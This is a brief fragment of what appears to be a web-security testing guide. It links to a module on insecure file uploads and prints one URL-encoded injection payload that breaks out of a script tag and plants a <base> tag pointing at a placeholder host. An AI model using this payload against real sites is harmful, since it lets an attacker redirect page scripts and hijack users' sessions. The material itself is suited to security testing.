...
- [upload insecure files](../upload-insecure-files/MODULE.md) when you need the full upload path: validation, storage, preview, and sharing behavior
...
```
?"></script><base%20c%3D=href%3Dhttps://example.invalid/>
```
